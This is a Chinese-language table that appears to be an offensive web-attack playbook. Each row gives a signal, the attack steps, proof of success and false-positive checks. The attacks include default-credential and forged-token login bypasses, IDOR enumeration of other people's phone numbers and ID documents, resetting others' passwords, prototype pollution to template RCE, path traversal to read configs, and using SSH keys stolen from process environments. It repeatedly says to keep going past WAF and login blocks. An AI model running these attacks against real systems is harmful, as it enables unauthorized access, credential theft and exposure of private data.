| 认证绕过 | 管理后台前端只跳 SSO，页面没有账密框；后端仍暴露账密登录 API | 不登录 POST 该登录 API 默认 `admin`/`123456`（不要磨 SSO 验证码），拿 accessToken 打 tenant/user page。见 `rules/techniques/authbypass-test.md`「SSO 壳后面的账密登录口」 | 进了平台管理员号，且租户/用户列表出他人手机/姓名 | 登录口 404 或默认口已改；票只能进空租户没有联系人 |
| 认证绕过 | 运营台前端把供应商直连配置查询挂成未登录；body 只有可枚举合作方数字 id | 不登录 POST 查询口，换邻号。对照未配置 id 应回查空。见 `rules/techniques/authbypass-test.md`「未登录合作方直连配置查询」 | 回包里是完整 clientId+clientSecret（能当这把直连钥用） | 接口已下线；clientSecret 空或占位；必须登录；只出公司名没有钥 |
| 认证绕过 | 联合登录签发口 body 只有 `provider`+云账号 `uin`（或同类 uid），不验 OAuth code/ticket | 不登录 POST 该口；再拿票打 me/用户信息。见 `rules/techniques/authbypass-test.md`「联合登录只吃 uin」 | me 是**对方** UIN，能当这个号用 | 只出游客号；uin 必须已在本活动注册且 me 仍是自己；必须真 OAuth code |
| 认证绕过 | 活动页 login 吃互联 `openid+acctype+access_token`；假 token 在 qq/qc/pt 仍发票，wx/空票对照失败 | 不登录 POST login 假 token + 可枚举 openid；拿 JWT 打 getRoles/bindRole 一类角色口。见 `rules/techniques/authbypass-test.md`「活动实验室 login 不校验互联票」 | 票里是对方 openid，角色列表出现他名下角色，或能绑上 | 只签发空号且角色列表全空、绑不上游戏角色；必须真互联票 |
| 越权/IDOR | 未登录隐私号/虚拟号（AXB）口；失败时把真实手机当下发；对象号可遍历 | 不登录换门店/对象号。网关空 Origin 或本站 Origin 回 cross-origin 403 **别停**，改业务域 Origin（订单/购物车/H5 域，不钉某一家 host）再打。见 `rules/techniques/idor-test.md`「隐私号失败回真实号」 | 回包是他人 11 位真实手机（文案写获取隐私号失败也算） | 只出虚拟号/中间号；必须登录；换号号码不变；空 Origin 403 当没口 |
| 越权/IDOR | 物流/开放网关前端写死「无需鉴权」头 + 域名路由头（或同类过网关鉴权头） | 不登录带着这组头打可枚举 siteId / 空翻页名单/运单口。见 `rules/techniques/idor-test.md`「过网关无需鉴权头」 | 出他人手机/住址/站点联系人 | 头过了业务仍请登录；只有公开轨迹没有 PII |
| 认证绕过 | 培训/学院 H5 网关把账号绑定/查询 RPC 放进未登录 client 前缀，body 吃 C 端 uid + 商家号 | 不登录 POST bind，uid 换成别人、商家号换成自编；再 querybind。见 `rules/techniques/authbypass-test.md`「未登录培训绑定口」 | 出对方手机，或绑定成功改绑 | 只回未登录/参数异常；uid 一律未绑手机且写不进 |
| 认证绕过 | 未登录改密/首次设密/重置最后一步；body 有旧密或验码字段 + 新密 + 身份 id | 不登录。旧密/验码置空或省略；对照填错验码应拦、不存在 id 应查空。同一密再打若报历史重复=已写入。见 `rules/techniques/authbypass-test.md`「未登录改密口」 | 未登录 Success 且改掉别人的密（历史重复/错码对照能证明写库） | 只回 0 没写库；必须真旧密/真短信；Success 但登录另一套、密没跟过去 |
| 认证绕过 | IDaaS 忘记密码先签发非 reset 的 JWT（scope=`_` 一类）；密保题库有未绑到该号的 id 可写 | 不登录拿 sq 类 token；GET 已绑 id；`update_question` 写未占用 id；verify 换 reset scope；再 `set_password`。见 `rules/techniques/authbypass-test.md`「IDaaS 未占用密保题」 | 密保答案写到别人号上（改绑），或用该令牌真改掉别人的密。过了改回；改不回停在回包 | sq token 直接改密报 scope is not expected；已绑 id 409；verify 错答；策略拒且密保没写上（半条，不进表） |
| 越权/IDOR | 公开列表只出上架/公开；详情、hidden、tab、短 slug、预览/导出用同一个业务 id，不校验这层闸。或列表有可见性查询参默认把隐藏滤掉。或列表要登录/空包、详情只要数字 id + 业务键。或对外详情把联系人/手机置空。或 `period=edit 或 publish`。或筛选项 null/缺字段报错、空数组当不过滤。或文档 CMS 写死公开 area/端/channel。或文档站公开 itemList 只出对外产品，item 用纯数字仍出对内/未对外知识库正文。或搜索口素材类型默认公开。或入驻/审核 query 只带业务 id 出空壳。或全量列表口不带可见性参行里就带着 unpublished 正文。或浏览页请登录、同站 search/文件列表/visit-log 仍出正文。或内容 SPA 按 host 正则选站点域 | 不登录。按 `rules/techniques/idor-test.md`「列表过滤详情不闸」里的别停表打：可见性参、全量列表、browse 请登录跟 search、详情修了跟 visit-log、目录请登录跟文件列表+PreviewUrl、SPA 站点 TLD、证照图注册人行、telephone 打码看备注、公开 itemList 只有对外几本仍用数字 item 打详情/page、收集表详情 relative 挂答卷 sheet 跟答卷表。**预览口 `isDelete=1` / 已删除仍出整页 H5 别停** | 未上架/未公开业务正文；或他主体证件照/手机；或证照图注册人行印着身份证号 | 详情本来就是公开橱窗；加了可见性参仍只出公开稿；只有标题没有正文；列表 401 就当没洞；edit 和 publish 出同一份已上架正文；空数组和缺参出同一份上架稿；`materialType` 仍只出公开橱窗；只带业务 id 出空壳就当没洞、没再加审核状态；浏览页写请登录就当没洞；打错站点域当没口不是假点；预览只出已上架运营页 |
| 越权/IDOR | 业务 H5 把登录 RPC 写在需登录前缀；同网关另有未登录前缀（n/unlogin/guest） | 不登录。JS 里的登录前缀口请登录别停，把 path 改成未登录前缀，再换对象 id。见 `rules/techniques/idor-test.md`「登录前缀双胞胎」 | 不登录出他人身份证/证件照/手机 | 未登录前缀仍请登录；只有公开配置；只有自己刚交的补件 |
| 越权/IDOR | 业务页 JS 调数字 RPC 网关（`/data/{数字}/forward` 一类），页面只写死一个 cmd | 不登录 POST 邻号，先空 `{"req":{}}` 看列表，再带 id 打邻写口。见 `rules/techniques/idor-test.md`「数字 RPC 邻 cmd」 | 内部发布/操作人正文，或字段被改 | 邻号仍是同一套公开接口；只出公开软件目录 |
| 越权/IDOR | 同产品业务前端的账号 CRUD 口回登录闸；另有独立身份子域，同一套账号 API 不要 Cookie | 不登录。前端 NoLogin 别停，改打身份子域 list（空包也出整表），再 generate / reset-pwd 只带 Id / delete。见 `rules/techniques/idor-test.md`「身份域账号 CRUD」 | 名单里是手机/企业邮箱；能建号、不验旧密改密、按 Ids 删 | 只打了业务前端就当没洞；list 出数但 Mail/Phone 全空且写口也闸 |
| 越权/IDOR | 开放平台 / 分销合作入驻申请查询口；未登录；参是执照号、手机号或名字关键字。页面查询空时 JSON 格式参常还在出数 | 不登录打申请查询。执照号从 1 自增，或换手机号 / 申请单号 / 名字关键字。页面格子空别停，加 `f=json`（或同类 format 参）再打。名录页是登录壳时，同目录 `search`/`list` 再打一枪，不必关键字也可能整表出联系人。见 `rules/techniques/idor-test.md` | 出他人联系人手机 / 邮箱 / 身份证 / 执照图 | 只回公开合作名录没有联系人；页面和 JSON 都只有公开格子；只回自己刚交的单；执照号无效 |
| 越权/IDOR | 报名/入驻/发票抬头自动完成；页上下拉只出公司名；接口走工商 Match 或抬头 suggest（前端可能标 auth） | 不登录 POST。名称+国家码；suggest 字段可能是 `prefix`（填 `title` 报关键词空别停）。同产品还有专票/工商补全口，字段就是 `title`。前端标 auth 仍打。见 `rules/techniques/idor-test.md`「公司名/抬头自动完成」 | 回包出现负责人或开票手机/住址/银行账号，且对得上人 | 下拉和接口都只有公司名；必须登录；公开企业名录没有电话；前端标 auth 就当没洞 |
| — | 未登录字典补全口；分类参前端只示范区号/城市一类，后端能切到用户/员工表 | 不登录 POST，分类填 `user`（或 employee），filter 用号段或姓 | name 里是他人姓名+11 位手机 | 只出公开城市/公司字典；user 分类空或只有 MIS 没有手机 |
| 越权/IDOR | 注册 / 改资料 / 建用户的 JSON 比页面控件多；Swagger 或管理员建用户多出字段 | 多塞 `role`/`isAdmin`/`verified`/`tenantId`/`balance`。见 `rules/techniques/idor-test.md`「Mass Assignment / 隐藏可写字段」 | 自己号变成高权，或余额/认证状态真变（能改回） | 字段吃了权限没变；只能改展示名；公开运营开关 |
| 原型污染 | Node JSON/query 能污染 `__proto__` 或 `constructor.prototype`；后面有 `res.render` / EJS / Pug | 先确认污染通了，再打 `outputFunctionName` / Pug `block`。见 `rules/techniques/prototype-pollution-test.md`「PP 打到模板 RCE」 | 模板渲染后命令跑起来（标记/`uid=`） | 只能改前端展示、没有模板/spawn gadget；污染一请求就没了、下一次 render 不跟 |
| 穿越/LFI | 站上已有 `/static` `/assets` `/img` `/files` 这类静态前缀；或 Caddy 模板吃用户输入 | `/static../` 读 web 外文件；Caddy 模板试 `{{readFile "path"}}`。见 `rules/techniques/path-traversal-lfi-test.md`「Nginx alias 缺斜杠」 | 读到 `nginx.conf` / 应用配置 / 密钥文件 | 只 404；只能列静态目录里本来就有的文件；Caddy 模板不执行用户输入 |
| 穿越/LFI | Node 把仓库根交给 koa-static / express.static（能直接 GET 到 `package.json` 或 `routes/`） | 不登录打 `/config/online.yml` `/config/default.yml` `/config/production.yml`；有 `package.json` 就顺着 node-config 环境名扫。见 `rules/techniques/path-traversal-lfi-test.md`「仓库根当静态」 | yml/json 里是**完整库账密或云密钥实值** | 静态根只出 public；yml 没有账密；`package.json` 200 但 config 404 |
| 穿越/LFI | 对象存储/静态桶上的旧 .NET 发布物；aspx 源码还能 GET，同目录 `web.config` 被 WAF 拦 | 不登录。`web.config` 456 别停，打同目录 `App.config`、`*.exe.config`、`bin/*.dll.config`。见 `rules/techniques/path-traversal-lfi-test.md`「静态桶上的 .NET 发布物」 | 完整账密或 DeveloperToken，不是 `ENTER_YOUR_PASSWORD` 占位 | aspx 200 但 config 404；只有源码没有钥；占位符口令 |
| 穿越/LFI | 公网 VS Code 系编辑器；`/login` 直接进（无登录墙） | 不登录打资源接口，path 吃绝对路径时先读进程 status 看 Uid，再读进程环境。页面里 `AuthType.None` 是常见皮，没有这个字仍打。抄到环境里的 SSH 私钥别停：解开 PEM，假钥对照连环境里的 Git 主机。见 `rules/techniques/path-traversal-lfi-test.md`「公网 VS Code 系读进程环境」 | 环境里是**他人**邮箱和完整 SSH 私钥，且真钥能问出 Git 用户名 | 只读到 README/安装脚本；path 要登录；真假钥同一句 Permission denied |
| 云IDE/RCE | 公网编程台有租户登录口 + Codex 系 RPC（`command/exec` / `fs` / `env`） | 当前站打裸默认口拿会话，再打 RPC。无 Cookie 也试 `meta/methods`。跟 env / 集群 SA / 模型 Key。**只打当前站**。见 `rules/techniques/cloud-ide-codex-rce-chain.md`「Codex 系编程台 RPC」 | root（`uid=0`）且 hostname 是持久计算面，并能问出集群钥或模型 Key | 通配符证书临时沙箱随时销毁；只登录没有 RPC；命令没跑起来 |
| 认证绕过 | 未登录业务口 JSON 报「缺少 xxx」；query/body 带了仍报缺少。或 Spring 400 点名 `Required String parameter`，缺的其实是 Cookie 名 | 把缺的字段放到 **HTTP 头**再打换票。头没吃别停，改打 Cookie。未登录写口同样试。见 `rules/techniques/authbypass-test.md`「缺参字段改头换票」 | 出别人的登录票/姓名；或写上他人门店/对象 | query 有该字段仍报缺少（头和 Cookie 都没吃）不算过；只出自己的票 |
| 认证绕过 | JSON 网关刷新票口；空包就发票，票里是 admin | 不登录 POST refresh `{}`，Bearer 打管理 me 和申请名单。见 `rules/techniques/authbypass-test.md`「刷新票空包发管理员票」 | me 是超级管理员 *，或名单出现他人手机 | 只出游客票；refresh 要旧 refresh token；me 仍是自己 |
| 认证绕过 | 小程序/H5 GET 登录口吃 `openId`（`loginByOpenId` 一类） | 不登录。缺参报缺、假值失败别停，空串再打。见 `rules/techniques/authbypass-test.md`「空 openId 进已有号」 | 进已有商家号且出手机 | 空串只出游客空号 |
| 文件/存储链 | 软件/制品下载详情把 query 里 `uin`（或同类身份字段）有无当登录闸，不验 skey/Cookie | 不登录 GET 详情，身份字段填非空假值（对照空值 DownloadURL 应是空串/跳登录）。拿回的带签 URL Range GET 真文件。见 `rules/techniques/file-upload-test.md` | 专有云安装包/内部部署文档真文件（ELF/docx 正文） | 空 uin 也出 URL（那是完全无鉴权，另一条）；带签地址 403；只有公开说明书 |
| 凭证泄露 | 企业软件中心人打开是登录页；另有领对象存储带签口不要 Cookie；或同站 `/download/`+软件文件名不要 Cookie；包里是桌面客户端连接配置（Host/账号/密文） | 不登录打领签口（登录墙 302 体里内联的也算）。**领签没有也别停**，首页/302 体里的软件文件名同站 `/download/` 直 GET。解 zip 里的连接配置。解密钥见 `rules/techniques/info-leak-test.md`「匿名领签包里的连接配置」 | 内网库 Host+账号+明文密 | 包里只有公开客户端没有连接配置；密文解不开；只打了领签口就当没静态目录 |

TECHNIQUE_INDEX_EOF
